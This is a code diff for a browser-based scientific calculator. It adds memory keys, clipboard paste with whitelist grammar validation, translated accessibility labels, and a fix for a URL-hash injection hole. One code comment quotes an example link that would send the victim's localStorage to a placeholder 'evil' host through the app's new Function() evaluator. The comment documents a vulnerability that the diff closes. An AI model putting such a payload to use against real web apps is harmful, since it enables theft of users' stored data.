@@ -46,7 +46,7 @@
       "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
       "description": "免費線上科學計算機，內建 100 條公式庫、函數繪圖、3D 曲面、微積分可視化、單位換算與即時匯率。",
       "browserRequirements": "Chrome 90+, Firefox 88+, Safari 14+, Edge 90+",
-      "softwareVersion": "3.9.0",
+      "softwareVersion": "3.10.0",
       "inLanguage": ["zh-TW", "en", "zh-CN", "ja"],
       "author": { "@type": "Person", "name": "boboidvtw" }
     }
@@ -490,6 +490,43 @@
             font-size: 12px; color: var(--text-dark-secondary);
             margin-top: 8px; text-align: right;
             font-family: 'Courier New', monospace;
+        }
+
+        /* ===== 記憶鍵（v3.10.0）===== */
+        .memory-bar {
+            display: flex; align-items: center; justify-content: space-between;
+            gap: 10px; margin-bottom: 16px; flex-wrap: wrap;
+        }
+
+        .memory-keys { display: flex; gap: 6px; }
+
+        .mem-btn {
+            min-width: 52px; min-height: 40px;
+            padding: 8px 12px;
+            border: 1px solid var(--border-interactive);
+            border-radius: 8px;
+            background: var(--bg-dark-tertiary);
+            color: var(--text-dark);
+            font-family: 'Courier New', monospace;
+            font-size: 13px; font-weight: 700;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .mem-btn:hover:not(:disabled) { transform: translateY(-2px); opacity: 0.9; }
+        /* 與 .btn 共用的鍵盤回饋（排在 :hover 之後才勝出，兩者 specificity 相同） */
+        .mem-btn.btn-keypress { transform: scale(0.94); opacity: 0.7; }
+        /* MC / MR 在記憶為空時停用 —— 記憶是不是空的，光看按鈕就該知道 */
+        .mem-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .mem-indicator {
+            font-family: 'Courier New', monospace;
+            font-size: 13px; font-weight: 700;
+            color: var(--primary-text);
+            max-width: 55%;
+            overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .mem-btn.btn-keypress, .mem-btn:hover:not(:disabled) { transform: none; }
         }
 
         /* ===== Tabs (主標籤) ===== */
@@ -1762,6 +1799,22 @@
 
                 <!-- ===== 計算區 ===== -->
                 <div id="calcPanel" class="tab-content">
+                    <!-- v3.10.0 記憶鍵。刻意放在 .display 之外：.display 整塊綁了「點擊複製結果」，
+                         按鈕若放進去會變成每按一次記憶鍵就順手複製一次。 -->
+                    <div class="memory-bar" id="memoryBar">
+                        <div class="memory-keys">
+                            <button type="button" class="mem-btn" data-mem="MC" id="memClearBtn"
+                                    aria-label="記憶清除" data-i18n-aria="mem_clear">MC</button>
+                            <button type="button" class="mem-btn" data-mem="MR" id="memRecallBtn"
+                                    aria-label="記憶讀取" data-i18n-aria="mem_recall">MR</button>
+                            <button type="button" class="mem-btn" data-mem="M+"
+                                    aria-label="記憶加上目前的值" data-i18n-aria="mem_add">M+</button>
+                            <button type="button" class="mem-btn" data-mem="M&#8722;"
+                                    aria-label="記憶減去目前的值" data-i18n-aria="mem_sub">M&#8722;</button>
+                        </div>
+                        <div class="mem-indicator" id="memIndicator" role="status" aria-live="polite" aria-atomic="true"></div>
+                    </div>
+
                     <!-- 5 分類按鈕 -->
                     <div class="calc-cats">
                         <button class="calc-cat active" data-cat="math">數學</button>
@@ -2192,7 +2245,28 @@
                         <li><strong>其他符號</strong>：<code>^</code> 次方、<code>%</code> 百分比、<code>!</code> 階乘、<code>|</code> 絕對值、<code>( )</code> 括號、<code>,</code> 參數分隔</li>
                         <li><strong>Enter</strong> 或 <code>=</code> 計算、<strong>Backspace</strong> 退一格、<strong>Esc</strong> 或 <strong>Delete</strong> 清除</li>
                         <li><strong>進位</strong>分類下改為輸入 <code>0</code>–<code>9</code> <code>A</code>–<code>F</code>，不合法的位元會被忽略</li>
+                        <li><strong>記憶鍵</strong>：<code>m</code> 存入（M+）、<code>r</code> 讀取（MR）、<code>Shift</code>+<code>M</code> 清除（MC）</li>
+                        <li><strong>貼上</strong>：<code>Ctrl</code>/<code>Cmd</code>+<code>V</code> 把剪貼簿的算式貼進計算機</li>
                         <li>游標在任何輸入框內、或有彈窗開啟時不會攔截按鍵，可正常打字</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="help-section">
+                <div class="help-section-header" role="button" tabindex="0" aria-expanded="false">
+                    <span><span class="help-section-icon">🧠</span> <span class="help-section-title">記憶鍵與貼上</span></span>
+                    <span class="help-chevron">▼</span>
+                </div>
+                <div class="help-body">
+                    <ul>
+                        <li><strong>M+ / M−</strong>：把<em>目前算式的值</em>加進／減出記憶。算式沒算完也沒關係（例如螢幕上是 <code>12×7</code>），會先求值再累加</li>
+                        <li><strong>MR</strong>：把記憶值叫回算式；目前是 <code>0</code> 就直接取代，否則接在後面。記憶是負數時會自動加上括號</li>
+                        <li><strong>MC</strong>：清除記憶。記憶為空時 MC / MR 會呈停用狀態，右側的 <code>M</code> 指示也會消失</li>
+                        <li>記憶值存在瀏覽器本機（localStorage），關掉分頁再開仍在；不會上傳</li>
+                        <li><strong>貼上</strong>：從郵件、試算表、網頁複製的算式可直接 <code>Ctrl</code>/<code>Cmd</code>+<code>V</code> 貼進來。全形符號、各種減號、千分位逗號會自動正規化</li>
+                        <li>貼上的內容會先做文法驗證，含計算機不認得的字元時<strong>整段拒絕</strong>並提示，不會只貼一半</li>
+                        <li>千分位只在整段沒有函數呼叫時才拆解：<code>nCr(5,123)</code> 的參數分隔與千分位長得一樣，一律拆會改掉算式語意</li>
+                        <li><strong>進位</strong>分類下貼上會改用該進位的合法位元驗證（例如 BIN 只收 <code>0</code> / <code>1</code>）</li>
                     </ul>
                 </div>
             </div>
@@ -2571,6 +2645,8 @@
                 tab_calc: '計算', tab_unit: '單位', tab_currency: '匯率',
                 tab_formula: '公式', tab_saved: '儲存',
                 btn_clear: 'C', btn_backspace: '←', btn_add: '新增',
+                mem_clear: '記憶清除', mem_recall: '記憶讀取',
+                mem_add: '記憶加上目前的值', mem_sub: '記憶減去目前的值',
                 sidebar_common: '常用按鈕', sidebar_functions: '支援函數',
                 sidebar_rate: '即時匯率', rate_unit: '1 TWD',
                 formula_builtin: '內建公式', formula_custom: '自建公式',
@@ -2597,6 +2673,8 @@
                 tab_calc: 'Calc', tab_unit: 'Unit', tab_currency: 'Exchange',
                 tab_formula: 'Formula', tab_saved: 'Saved',
                 btn_clear: 'C', btn_backspace: '←', btn_add: 'Add',
+                mem_clear: 'Clear memory', mem_recall: 'Recall memory',
+                mem_add: 'Add displayed value to memory', mem_sub: 'Subtract displayed value from memory',
                 sidebar_common: 'Quick Button', sidebar_functions: 'Functions',
                 sidebar_rate: 'Exchange Rate', rate_unit: '1 TWD',
                 formula_builtin: 'Built-in Formula', formula_custom: 'Custom Formula',
@@ -2623,6 +2701,8 @@
                 tab_calc: '计算', tab_unit: '单位', tab_currency: '汇率',
                 tab_formula: '公式', tab_saved: '保存',
                 btn_clear: 'C', btn_backspace: '←', btn_add: '添加',
+                mem_clear: '记忆清除', mem_recall: '记忆读取',
+                mem_add: '记忆加上当前的值', mem_sub: '记忆减去当前的值',
                 sidebar_common: '常用按钮', sidebar_functions: '支持函数',
                 sidebar_rate: '实时汇率', rate_unit: '1 TWD',
                 formula_builtin: '内置公式', formula_custom: '自建公式',
@@ -2649,6 +2729,8 @@
                 tab_calc: '計算', tab_unit: '単位', tab_currency: 'レート',
                 tab_formula: '公式', tab_saved: '保存',
                 btn_clear: 'C', btn_backspace: '←', btn_add: '追加',
+                mem_clear: 'メモリクリア', mem_recall: 'メモリ呼び出し',
+                mem_add: '表示中の値をメモリに加算', mem_sub: '表示中の値をメモリから減算',
                 sidebar_common: 'よく使う', sidebar_functions: 'サポート機能',
                 sidebar_rate: 'レート', rate_unit: '1 TWD',
                 formula_builtin: '組込公式', formula_custom: 'カスタム公式',
@@ -2995,12 +3077,30 @@
 
         // ========== URL Hash Parsing ==========
         function handleUrlHash() {
-            if (window.location.hash.startsWith('#calc=')) {
-                let expr = decodeURIComponent(window.location.hash.substring(6));
-                currentDisplay = expr;
-                updateDisplay();
-                document.querySelector('.tab[data-tab="calc"]').click();
+            if (!window.location.hash.startsWith('#calc=')) return;
+            let expr;
+            // 壞掉的百分號編碼會讓 decodeURIComponent 直接丟 URIError
+            try { expr = decodeURIComponent(window.location.hash.substring(6)); } catch (err) { return; }
+
+            // [SECURITY][v3.10.0] 這裡的內容來自網址 —— 也就是任何人都能做一條連結拿給別人點。
+            // calculate() 最終是 new Function() 求值，而在此之前這條路徑是**零驗證**直接寫入
+            // currentDisplay 的：`#calc=1,(fetch('//evil/?d='+JSON.stringify(localStorage)))`
+            // 這種連結，受害者只要按一次「=」就會執行（JS 的逗號運算子讓它成為 return
+            // 表達式的一部分，而不是 return 後面的死碼）。本地實測已重現。
+            //
+            // 這是 v3.10.0 之前就存在的漏洞，不是貼上功能引入的；但貼上這版寫的文法驗證
+            // 正好就是這條路徑缺的東西，兩邊共用同一份，不要留兩套標準。
+            const result = sanitizePastedExpression(expr);
+            if (!result.ok) {
+                // 訊息要講「網址」而不是「貼上」—— 使用者這時根本沒有貼上任何東西
+                showToast(result.reason === 'too_long'
+                    ? '⚠️ 網址中的算式太長，已忽略'
+                    : '⚠️ 網址中的算式含計算機不認得的字元，已忽略');
+                return;
             }
+            currentDisplay = result.value;
+            updateDisplay();
+            document.querySelector('.tab[data-tab="calc"]').click();
         }
 
         // ========== Toast Notification ==========
@@ -3055,6 +3155,12 @@
             document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                 const key = el.dataset.i18nPlaceholder;
                 el.placeholder = t(key, el.placeholder);
+            });
+            // v3.10.0：記憶鍵的按鈕面只有 'M+' 這種符號，語意全靠 aria-label，
+            // 不跟著切語言的話螢幕閱讀器使用者就永遠停在繁中。
+            document.querySelectorAll('[data-i18n-aria]').forEach(el => {
+                const key = el.dataset.i18nAria;
+                el.setAttribute('aria-label', t(key, el.getAttribute('aria-label')));
             });
         }
 
@@ -4873,6 +4979,10 @@
         function calculate(expr) {
             function factorial(n) {
                 if (n < 0 || !Number.isInteger(n)) return NaN;
+                // 170! 已是 double 的極限（171! = Infinity），再大只是讓迴圈空轉。
+                // 沒有這道上限時，`999…999!` 這種一行輸入會讓分頁凍死 —— 貼上功能把
+                // 「刻意按幾十次鍵」降成「貼一次」，所以這條上限在 v3.10.0 補上。
+                if (n > 170) return Infinity;
                 if (n === 0 || n === 1) return 1;
                 let r = 1;
                 for (let i = 2; i <= n; i++) r *= i;
@@ -4995,6 +5105,7 @@
                     btn.classList.add('active');
                     currentCalcCat = btn.dataset.cat;
                     document.getElementById(currentCalcCat + 'Grid').classList.remove('hidden');
+                    updateMemoryBarVisibility();
                 });
             });
         }
@@ -5056,6 +5167,113 @@
             }
         }
 
+        // ========== Memory Keys（v3.10.0）==========
+        // 一台計算機最標準的四顆鍵，在此之前完全缺席（全檔 memory 命中 0）。
+        // 語意照標準工程計算機：M+ / M− 先把「目前算式」求值再累加，不是把字串接上去。
+        const MEMORY_STORAGE_KEY = 'calcMemory';
+        const MEMORY_DISPLAY_MAX = 14;
+        const memoryBar = document.getElementById('memoryBar');
+        const memIndicator = document.getElementById('memIndicator');
+        const memClearBtn = document.getElementById('memClearBtn');
+        const memRecallBtn = document.getElementById('memRecallBtn');
+
+        // parseFloat(null) 是 NaN、parseFloat('0') 是 0 —— 兩者都要落到 0，
+        // 但不能用 `|| 0` 之後就忘記：後面所有判斷都以 0 代表「記憶為空」。
+        let calcMemory = (() => {
+            const stored = parseFloat(localStorage.getItem(MEMORY_STORAGE_KEY));
+            return Number.isFinite(stored) ? stored : 0;
+        })();
+
+        // 目前顯示的內容可能是算式（'12+7'）而不是單一數字，M+ 要的是它的值。
+        // 算不出來就回 null，讓呼叫端顯式處理，不要靜靜當成 0 累加進去。
+        function currentDisplayValue() {
+            if (currentDisplay === 'Error') return null;
+            const raw = calculate(currentDisplay);
+            if (raw === 'Error') return null;
+            const n = typeof raw === 'number' ? raw : parseFloat(raw);
+            return Number.isFinite(n) ? n : null;
+        }
+
+        // 負數要包括號：直接接在算式尾端會變成 '3+−5' 這種難讀的字串。
+        // 減號用 U+2212 而非 String() 產生的 ASCII '-'：按鈕、鍵盤（KEY_TO_CALC_TOKEN）
+        // 與貼上（正規化最後一步）三條路徑都收斂到 U+2212，記憶不該是唯一的例外。
+        function formatMemoryForInput(v) {
+            const s = String(v).replace('-', '−');
+            return v < 0 ? '(' + s + ')' : s;
+        }
+
+        // MR 插進算式的「位置」有語意，不能一律接在字串尾端。實測過的三種壞法：
+        //   '88'      接 '(−12)' → '88(−12)'  在 JS 裡是「以 88 為 callee 的函式呼叫」→ Error
+        //   '88'      接 '12'    → '8812'     更糟：靜靜變成一個沒人要的數字，連錯誤訊號都沒有
+        //   'sin(30)' 接 '5'     → 'sin(30)5' → Error
+        // 標準計算機的 MR 是「把記憶值放進目前正在輸入的那個數」，不是字串串接。
+        const MEMORY_VALUE_TAIL_RE = /(\d+\.?\d*(?:e[+−-]?\d+)?)$/;
+
+        function applyMemoryRecall() {
+            if (calcMemory === 0) return;
+            const text = formatMemoryForInput(calcMemory);
+            if (currentDisplay === 'Error' || currentDisplay === '0') {
+                currentDisplay = text;
+            } else if (MEMORY_VALUE_TAIL_RE.test(currentDisplay)) {
+                // 尾端正在輸入一個數 → 用記憶值取代它（replace 用函式，避免 text 裡的
+                // '$' 之類字元被當成替換樣式解讀）
+                currentDisplay = currentDisplay.replace(MEMORY_VALUE_TAIL_RE, () => text);
+            } else if (/[)!%]$/.test(currentDisplay)) {
+                // 尾端是一個已完成的值（右括號 / 階乘 / 百分比）→ 補乘號，
+                // 否則兩個值在算式上直接相鄰不成立
+                currentDisplay += '×' + text;
+            } else {
+                // 尾端是運算子 / 左括號 / 逗號 → 直接接上
+                currentDisplay += text;
+            }
+            displayFormula.textContent = '';
+            updateDisplay();
+        }
+
+        function formatMemoryForDisplay(v) {
+            const s = String(v);
+            return s.length > MEMORY_DISPLAY_MAX ? s.slice(0, MEMORY_DISPLAY_MAX - 1) + '…' : s;
+        }
+
+        function setCalcMemory(v) {
+            // 寫入端與載入端要對「合法記憶值」用同一個定義。M+ 累加溢位得到的是
+            // Infinity 而非 NaN，currentDisplayValue() 的單值防呆攔不到；不擋的話記憶
+            // 會卡在 Infinity，之後每次 MR 都讓算式變成 Error。
+            if (!Number.isFinite(v)) { showToast('⚠️ 記憶值超出可表示範圍，未變更'); return; }
+            calcMemory = Object.is(v, -0) ? 0 : v;
+            localStorage.setItem(MEMORY_STORAGE_KEY, String(calcMemory));
+            updateMemoryIndicator();
+        }
+
+        function updateMemoryIndicator() {
+            const hasValue = calcMemory !== 0;
+            // 空的時候整個指示器留白，而不是顯示 'M 0' —— 那會讓「記憶存了 0」
+            // 與「記憶是空的」長得一模一樣。
+            memIndicator.textContent = hasValue ? 'M ' + formatMemoryForDisplay(calcMemory) : '';
+            memClearBtn.disabled = !hasValue;
+            memRecallBtn.disabled = !hasValue;
+        }
+
+        // 進位換算的輸入是 baseInput（另一套狀態、可能是 16 進位字串），
+        // 與十進位的記憶值不相通，故該分類下整條列收起來而不是留著讓人按了沒反應。
+        function updateMemoryBarVisibility() {
+            memoryBar.classList.toggle('hidden', currentCalcCat === 'base');
+        }
+
+        function applyMemoryOp(op) {
+            if (op === 'MC') { if (calcMemory !== 0) setCalcMemory(0); return; }
+            if (op === 'MR') { applyMemoryRecall(); return; }
+            const value = currentDisplayValue();
+            if (value === null) { showToast('⚠️ 目前的算式算不出值，記憶未變更'); return; }
+            setCalcMemory(op === 'M+' ? calcMemory + value : calcMemory - value);
+        }
+
+        document.querySelectorAll('.mem-btn').forEach(btn => {
+            btn.addEventListener('click', () => applyMemoryOp(btn.dataset.mem));
+        });
+
+        updateMemoryIndicator();
+
         // ========== Button Events ==========
         document.querySelectorAll('.btn').forEach(btn => {
             btn.addEventListener('click', () => {
@@ -5089,6 +5307,27 @@
             '=': '=', 'Enter': '=',
             'Backspace': '←', 'Escape': 'C', 'Delete': 'C'
         };
+        // v3.10.0 記憶鍵鍵位。Windows 小算盤那組（Ctrl+P/Q/R/L）在瀏覽器裡會撞掉
+        // 列印 / 重新整理 / 網址列，與既有「修飾鍵一律放行」的原則直接衝突，故不採用。
+        // 這裡只綁三個真正常用的操作，M− 留給按鈕 —— 硬湊第四個鍵位只會多一條沒人記得住的規則。
+        // Shift+M 給破壞性的 MC：多一個按鍵手勢，不會手滑清掉累積的記憶。
+        //
+        // [WARNING] 判斷 Shift 必須看 e.shiftKey，不能看 e.key 是大寫還是小寫：
+        // CapsLock 開著時按 m 送出的就是 'M'（shiftKey=false），靠大小寫分辨會讓
+        // 「存入記憶」直接變成「清除記憶」。破壞性操作不能建立在這種訊號上。
+        // （本地實測抓到：合成鍵盤事件送的是 key='m' + shiftKey=true，與真實瀏覽器的
+        //  key='M' 不同 —— 兩邊都只有 e.shiftKey 是可靠的。）
+        const MEMORY_KEY_OPS = {
+            m: { plain: 'M+', shift: 'MC' },
+            r: { plain: 'MR', shift: null }
+        };
+
+        function _memoryKeyOp(e) {
+            const k = typeof e.key === 'string' ? e.key.toLowerCase() : '';
+            if (!Object.prototype.hasOwnProperty.call(MEMORY_KEY_OPS, k)) return null;
+            const entry = MEMORY_KEY_OPS[k];
+            return e.shiftKey ? entry.shift : entry.plain;
+        }
         const KEYBOARD_IGNORED_TAGS = new Set(['INPUT', 'TEXTAREA', 'SELECT']);
         const KEYPRESS_FLASH_MS = 140;
 
@@ -5106,22 +5345,31 @@
             return /^[0-9A-F]$/.test(d) ? d : null;
         }
 
-        function _keyboardBlocked(e) {
-            // 讓瀏覽器 / 系統快捷鍵（Cmd+R、Ctrl+C…）原封不動通過
-            if (e.ctrlKey || e.metaKey || e.altKey) return true;
+        // v3.10.0：抽出「這次輸入該不該進計算機」的判斷，讓 keydown 與 paste 共用一份。
+        // 兩條路徑的差別只有修飾鍵（貼上本來就是 Ctrl/Cmd+V），其餘守衛必須一致，
+        // 否則會出現「打字不會灌進計算機、貼上卻會」這種不對稱。
+        function _calcSurfaceBlocked(el) {
             // modal 開著時鍵盤屬於該 modal（含既有的焦點陷阱與 Escape 關閉）
-            if (document.querySelector('.modal.active, .help-modal.active, .graph-modal.active')) return true;
-            const el = e.target;
+            // [v3.10.0] pro-modal（付款 / 授權碼）是用 hidden 屬性切換的，不帶 .active，
+            // 原本的選擇器認不得它 —— 實測：該 modal 開著時打字與貼上會灌進背景的計算機
+            // （畫面上看不到，使用者以為自己在填授權碼）。這是唯一牽涉金流的 modal。
+            if (document.querySelector('.modal.active, .help-modal.active, .graph-modal.active, .pro-modal-overlay:not([hidden]), #pro-modal:not([hidden])')) return true;
             if (el && (el.isContentEditable || KEYBOARD_IGNORED_TAGS.has(el.tagName))) return true;
             // 只在「計算」tab 生效：在單位 / 匯率 / 公式 / 儲存 tab 打字不該灌進計算機
             const panel = document.getElementById('calcPanel');
             return !panel || panel.classList.contains('hidden');
         }
 
+        function _keyboardBlocked(e) {
+            // 讓瀏覽器 / 系統快捷鍵（Cmd+R、Ctrl+C…）原封不動通過
+            if (e.ctrlKey || e.metaKey || e.altKey) return true;
+            return _calcSurfaceBlocked(e.target);
+        }
+
         // 讓使用者看得到自己按到哪一顆；找不到對應按鈕（或該鍵在目前進位模式下不合法
         // 而呈 disabled）就不閃，避免給出「有輸入」的假回饋。
         function _flashKey(token) {
-            const btn = [...document.querySelectorAll('#calcPanel .btn, .main-sidebar .btn')]
+            const btn = [...document.querySelectorAll('#calcPanel .btn, #calcPanel .mem-btn, .main-sidebar .btn')]
                 .find(b => b.offsetParent !== null && !b.disabled && b.textContent.trim() === token);
             if (!btn) return;
             btn.classList.add('btn-keypress');
@@ -5142,6 +5390,16 @@
 
             const baseGrid = document.getElementById('baseGrid');
             const inBaseMode = baseGrid && !baseGrid.classList.contains('hidden');
+
+            // 記憶鍵只在十進位模式有意義（進位模式的輸入是另一套狀態）
+            const memOp = inBaseMode ? null : _memoryKeyOp(e);
+            if (memOp) {
+                e.preventDefault();
+                applyMemoryOp(memOp);
+                _flashKey(memOp);
+                return;
+            }
+
             const token = inBaseMode ? _baseKeyToken(e.key) : _calcKeyToken(e.key);
             if (token === null) return;
 
@@ -5150,6 +5408,163 @@
             else applyCalcToken(token);
             _flashKey(token);
         }, true);
+
+        // ========== Paste（v3.10.0）==========
+        // 在此之前計算機只出得去（點 .display 複製結果）進不來 —— 從郵件、試算表、
+        // 別的網頁複製來的算式，只能對著螢幕一個字一個字重打。
+        //
+        // 這條路徑與鍵盤輸入有一個本質差異：內容不是使用者逐鍵打出來的，而 calculate()
+        // 最終是用 new Function() 求值。所以這裡走的是「文法驗證」而不是「字元清洗」：
+        // 整段必須能被下面的 tokenizer 完整吃完，吃不完就整段拒絕，不嘗試修好它。
+        const PASTE_MAX_LEN = 200;
+        // 引擎認得的函數名（= calculate() 裡有對應替換規則的那些）。這是封閉集合：
+        // 驗證的是「只允許這些」，不是「擋掉某些危險字」——後者是開放集合，擋不完。
+        const PASTE_FUNCTION_NAMES = ['asin', 'acos', 'atan', 'sinh', 'cosh', 'tanh',
+                                      'sin', 'cos', 'tan', 'sqrt', 'log', 'ln', 'exp',
+                                      'floor', 'ceil', 'abs', 'nCr', 'nPr', 'mod'];
+        // 長名優先，否則 'asin' 會先被 'sin' 吃掉而留下孤兒 'a'
+        const PASTE_FUNCTION_NAMES_SORTED = [...PASTE_FUNCTION_NAMES].sort((a, b) => b.length - a.length);
+        const PASTE_SYMBOLS = new Set(['+', '−', '×', '÷', '^', '%', '(', ')', ',', '!', '|', '√', 'π', 'e', '.', ' ']);
+        const PASTE_NUMBER_RE = /^\d+(\.\d+)?(e[+−-]?\d+)?/i;
+
+        // 全形、各種 dash、非標準乘除號 —— 從網頁與 PDF 複製來的算式幾乎一定帶這些。
+        // 正規化只做「同義字元對映」，不刪也不補任何語意。
+        function _normalizePasted(raw) {
+            return raw
+                .replace(/[\uFF01-\uFF5E]/g, c => String.fromCharCode(c.charCodeAt(0) - 0xFEE0))
+                .replace(/\u3000/g, ' ')
+                .replace(/[\u2013\u2014\u2012\u2015\u2010\u2011]/g, '−')
+                .replace(/[\u00B7\u22C5\u2217\u00D7]/g, '×')
+                .replace(/[\u2215\u00F7]/g, '÷')
+                .replace(/\s+/g, ' ')
+                .trim();
+        }
+
+        // 逗號在這個算式語言裡有兩種完全不同的身分：函數呼叫的參數分隔（nCr(5,2)）
+        // 與千分位（1,234）。而 calculate() 是用 new Function() 求值 —— JS 的頂層逗號是
+        // 「逗號運算子」，它會靜靜丟掉左邊的東西：'1,234 + sin(30)' 會算出 234.5 而不是
+        // 1234.5，看起來像個合理答案，錯得毫無症狀。
+        //
+        // 所以逗號必須依括號深度分辨，不能用「整段有沒有函數呼叫」這種全域旗標
+        // （第一版正是那樣寫的，回歸測試才抓到）。回傳 null 代表整段拒絕。
+        function _resolveCommas(s) {
+            let out = '';
+            const inFunctionArgs = [];   // 每層括號一格：true = 這層是函數呼叫的參數列
+            for (let i = 0; i < s.length; i++) {
+                const c = s[i];
+                if (c === '(') {
+                    inFunctionArgs.push(/[a-zA-Z]$/.test(out.trimEnd()));
+                    out += c;
+                } else if (c === ')') {
+                    // 多餘的右括號沒有正當用途，而 calculate() 是用 'return (' + expr + ')'
+                    // 包起來求值的 —— 讓深度變負等於提前關掉那層包裝。目前白名單裡沒有
+                    // ';' 或引號所以還逃不出去，但這是白送的防禦縱深。
+                    // （未閉合的左括號不擋：貼上一段還沒打完的算式繼續編輯是正當用法。）
+                    if (!inFunctionArgs.length) return null;
+                    inFunctionArgs.pop();
+                    out += c;
+                } else if (c === ',') {
+                    // 在函數參數列內 → 是分隔符，原樣保留
+                    if (inFunctionArgs.length && inFunctionArgs[inFunctionArgs.length - 1]) { out += c; continue; }
+                    // 不在參數列內 → 只可能是千分位，拆掉；不符千分位樣式就整段拒絕，
+                    // 因為留著它就是一個會吃掉左運算元的逗號運算子
+                    if (/\d$/.test(out) && /^\d{3}(?!\d)/.test(s.slice(i + 1))) continue;
+                    return null;
+                } else {
+                    out += c;
+                }
+            }
+            return out;
+        }
+
+        // 逐 token 掃過整段：數字 / 已知函數名 / 允許的符號。函數名之後必須立刻接 '('
+        // （mod 是中綴運算子，唯一的例外）——這一條是關鍵：它讓 'exp.call' 這種
+        // 「用合法函數名開頭、後面接別的東西」的字串在文法層就被擋下，
+        // 而不是靠「危險字元有沒有出現」這種推理去猜。
+        function _pastedTokensAllowed(s) {
+            let i = 0;
+            while (i < s.length) {
+                const rest = s.slice(i);
+                const num = rest.match(PASTE_NUMBER_RE);
+                if (num) { i += num[0].length; continue; }
+                const fn = PASTE_FUNCTION_NAMES_SORTED.find(f => rest.startsWith(f));
+                if (fn) {
+                    if (fn !== 'mod' && rest[fn.length] !== '(') return false;
+                    // 函數名不可緊接在一個「值」之後：'5exp(1)' 會被 calculate() 轉成
+                    // '5Math.exp(1)'，那在 JS 是語法錯（數字字面值後不能接識別字）。
+                    // 目前是 fail-safe（回 Error），但代表驗證與求值各自維護一份文法認知，
+                    // 哪天求值端變寬鬆就會開洞 —— 在驗證端就對齊掉。
+                    if (i > 0 && /[\d)!%]/.test(s[i - 1])) return false;
+                    i += fn.length;
+                    continue;
+                }
+                if (PASTE_SYMBOLS.has(rest[0])) { i += 1; continue; }
+                return false;
+            }
+            return true;
+        }
+
+        // 回傳 { ok, value } 或 { ok: false, reason }
+        function sanitizePastedExpression(raw) {
+            if (typeof raw !== 'string') return { ok: false, reason: 'empty' };
+            const trimmed = raw.trim();
+            if (!trimmed) return { ok: false, reason: 'empty' };
+            if (trimmed.length > PASTE_MAX_LEN) return { ok: false, reason: 'too_long' };
+
+            let s = _normalizePasted(trimmed);
+
+            // 統一成按鈕上的符號，讓「貼上」與「手打」產生逐字相同的算式
+            s = s.replace(/\*/g, '×').replace(/\//g, '÷').replace(/-/g, '−');
+
+            const resolved = _resolveCommas(s);
+            if (resolved === null) return { ok: false, reason: 'bad_syntax' };
+            s = resolved;
+
+            if (!_pastedTokensAllowed(s)) return { ok: false, reason: 'bad_syntax' };
+            return { ok: true, value: s };
+        }
+
+        const PASTE_REJECT_MESSAGE = {
+            empty: '⚠️ 剪貼簿沒有可貼上的文字',
+            too_long: '⚠️ 貼上的內容太長（上限 ' + PASTE_MAX_LEN + ' 字）',
+            bad_syntax: '⚠️ 貼上的內容含計算機不認得的字元'
+        };
+
+        // 用 paste 事件而非攔截 Ctrl+V：clipboardData 直接拿得到內容、不需要剪貼簿權限提示，
+        // 而且右鍵選單貼上、中鍵貼上、觸控長按貼上全都走同一條路。
+        document.addEventListener('paste', e => {
+            if (_calcSurfaceBlocked(e.target)) return;
+
+            const raw = (e.clipboardData || window.clipboardData)?.getData('text');
+            if (typeof raw !== 'string' || !raw.trim()) return;
+
+            const baseGrid = document.getElementById('baseGrid');
+            const inBaseMode = baseGrid && !baseGrid.classList.contains('hidden');
+
+            if (inBaseMode) {
+                e.preventDefault();
+                const digits = _normalizePasted(raw).toUpperCase().replace(/\s/g, '');
+                const valid = BASE_VALID_DIGITS[baseMode];
+                if (digits.length > PASTE_MAX_LEN || ![...digits].every(d => valid.includes(d))) {
+                    showToast('⚠️ 貼上的內容不是合法的 ' + baseMode + ' 數字');
+                    return;
+                }
+                [...digits].forEach(d => applyBaseToken(d));
+                showToast('📋 已貼上: ' + digits);
+                return;
+            }
+
+            e.preventDefault();
+            const result = sanitizePastedExpression(raw);
+            if (!result.ok) {
+                showToast(PASTE_REJECT_MESSAGE[result.reason] || PASTE_REJECT_MESSAGE.bad_syntax);
+                return;
+            }
+            // 走 applyCalcToken 而非直接改 currentDisplay，沿用它既有的
+            // 「Error 後自動重置」與「目前是 0 就取代而不是接在後面」語意。
+            applyCalcToken(result.value);
+            showToast('📋 已貼上: ' + result.value);
+        });
 
         // ========== Main Tabs ==========
         tabs.forEach(tab => {
